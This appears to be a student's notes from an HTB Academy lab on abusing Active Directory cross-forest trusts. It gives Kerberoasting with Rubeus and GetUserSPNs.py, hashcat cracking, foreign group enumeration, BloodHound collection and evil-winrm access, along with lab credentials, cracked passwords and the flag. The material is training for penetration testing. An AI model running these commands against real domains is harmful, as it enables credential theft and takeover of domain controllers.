# Attacking Domain Trusts - Cross-Forest Trust Abuse

## From Windows

### Cross-Forest Kerberoasting

We must be positioned in a domain with either an inbound or bidirectional domain/forest trust.

1) Enumerating Accounts for Associated SPNs Using Get-DomainUser
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc

2) Enumerating the mssqlsvc Account
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL

3) Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap /outfile:type.hash
[Convert]::ToBase64String((Get-Content -path "C:\tools\type.hash" -Encoding byte))
echo JG | base64 -d > type.hash

[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>

4) Hashcat
hashcat -m 13100 -a 0 type.hash /usr/share/wordlists/rockyou.txt 


### Admin Password Re-Use & Group Membership

In case of bidirectional forest trust :
If we obtain cleartext passwords or NT hashes in Domain A, it is worth checking this pwd/hash for the same user in domain B

1) Using Get-DomainForeignGroupMember
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator

2) Accessing DC03 Using Enter-PSSession
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL

--> successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust.

### SID History Abuse - Cross Forest

If SID Filtering is not enabled

## From Linux

### Cross-Forest Kerberoasting

1) Using GetUserSPNs.py
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 

2) Using the -request Flag
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile type.hash

3) hashcat
hashcat -m 13100 -a 0 type.hash /usr/share/wordlists/rockyou.txt 

--> it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use.

--> password spraying

### Hunting Foreign Group Membership with Bloodhound-python

1) Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
cat /etc/resolv.conf 
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

2) Running bloodhound-python Against INLANEFREIGHT.LOCAL
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

3) Compressing the File with zip -r
zip -r ilfreight_bh.zip *.json

4) Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
cat /etc/resolv.conf 
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238

4) Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

5) Compressing the File with zip -r
zip -r freightlogistics_bh.zip *.json

6) Viewing Dangerous Rights through BloodHound

Analysis > Users with Foreign Domain Group Membership


## LAB Windows

xfreerdp /u:htb-student /p:"Academy_student_AD!" /v:$TARGET


cd c:\tools
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap /outfile:type.hash
[Convert]::ToBase64String((Get-Content -path "C:\tools\type.hash" -Encoding byte))
echo  | base64 -d > type.hash

tail -f type.hash

$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$18A814CC958

hashcat -m 13100 -a 0 type.hash /usr/share/wordlists/rockyou.txt

1logistics

## LAB Linux

ssh htb-student@$TARGET
HTB_@cademy_stdnt!

GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
transporter@4

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>               


GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile type.hash



tail -f type.hash

$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$d00072ed3f8e

$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$e88178f3b89ee2eed

md5sum type.hash
95849b80782b2bec57ce81b0a628a304

cat type.hash |base64 -w 0;echo

echo -n '
' | base64 -d > type.hash

md5sum type.hash
95849b80782b2bec57ce81b0a628a304

hashcat -m 13100 -a 0 type.hash /usr/share/wordlists/rockyou.txt

pabloPICASSO

evil-winrm -i ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -u sapsso -p 'pabloPICASSO'

*Evil-WinRM* PS C:\Users\sapsso\Documents> type C:\Users\Administrator\Desktop\flag.txt
burn1ng_d0wn_th3_f0rest!
